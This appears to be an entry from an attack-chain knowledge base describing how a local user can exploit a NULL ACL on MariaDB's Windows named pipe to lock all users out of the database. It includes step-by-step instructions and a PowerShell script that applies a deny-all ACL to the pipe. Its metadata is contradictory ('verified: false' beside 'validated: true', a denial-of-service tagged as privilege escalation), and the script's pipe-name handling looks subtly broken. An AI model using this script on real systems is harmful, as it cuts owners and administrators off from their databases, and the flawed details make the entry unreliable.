---
id: ac-mariadb-pipe-dos-001
tags:
  - mariadb
  - windows
  - permission-misconfiguration
  - dos
  - privilege-escalation
type: attack_chain
tools: []
tactics:
  - '[[Privilege Escalation]]'
  - '[[Impact]]'
verified: false
platforms:
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Modify-MariaDB-Pipe-Permissions-via-NULL-ACL]]'
step_count: 1
techniques:
  - '[[File Permissions Modification]]'
updated_at: '2025-12-14T17:28:52.026Z'
description: >-
  A vulnerability in MariaDB server source code on Windows allows local
  attackers to modify pipe security descriptors due to a NULL ACL, enabling
  denial of access to the database service for all users including
  administrators.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[File Permissions Modification]]'
---
# MariaDB Windows Pipe Permission Misconfiguration Leading to Denial of Service

Multi-stage attack chain demonstrating exploitation of a NULL ACL vulnerability in MariaDB server on Windows, allowing local modification of pipe permissions to deny service access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Local Access] --> B[Modify Pipe Permissions]
    B --> C[Denial of Service]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Windows API tools or PowerShell for ACL modification

### Target Environment

- Windows OS
- MariaDB Server (version 10.3 or affected builds)
- Local user access to the system running MariaDB

### Initial Access Requirements

- Local non-admin access (due to NULL ACL allowing modification by any user)
- Running MariaDB instance with vulnerable pipe descriptor

## Detailed Attack Procedures

### Step 1: Modify Pipe Permissions
procedure: [[procedures/Modify-MariaDB-Pipe-Permissions-via-NULL-ACL]]

**Objective**: Exploit the NULL ACL on the MariaDB pipe security descriptor to deny access to all users, causing denial of service to the database.

**Instructions**: Identify the MariaDB named pipe (typically something like \\.\pipe\MariaDB or similar, depending on configuration). Use Windows tools to open the pipe handle and modify its security descriptor by setting a deny-all ACL for the Everyone group. This leverages the vulnerability where SetSecurityDescriptorDacl sets a NULL ACL, allowing unauthorized changes.

For example, using PowerShell to modify the ACL:

```powershell
$pipeName = "\\.\pipe\MariaDB"
$handle = [System.IO.Pipes.NamedPipeClientStream]::new(".", $pipeName, [System.IO.Pipes.PipeDirection]::InOut)
$handle.Connect()
$sd = New-Object System.Security.AccessControl.PipeSecurity
$sd.SetAccessRuleProtection($true, $false)
$denyRule = New-Object System.Security.AccessControl.PipeAccessRule("Everyone", "FullControl", "Deny")
$sd.AddAccessRule($denyRule)
$handle.SetAccessControl($sd)
$handle.Dispose()
```

**Expected Output**: The pipe's security descriptor is updated, and subsequent connection attempts by any user, including administrators, fail with access denied errors.

**Success Indicators**:
- Access denied errors when trying to connect to MariaDB via the pipe
- Verification using tools like Process Monitor showing ACL changes on the pipe object
- Database service becomes unresponsive to queries or connections
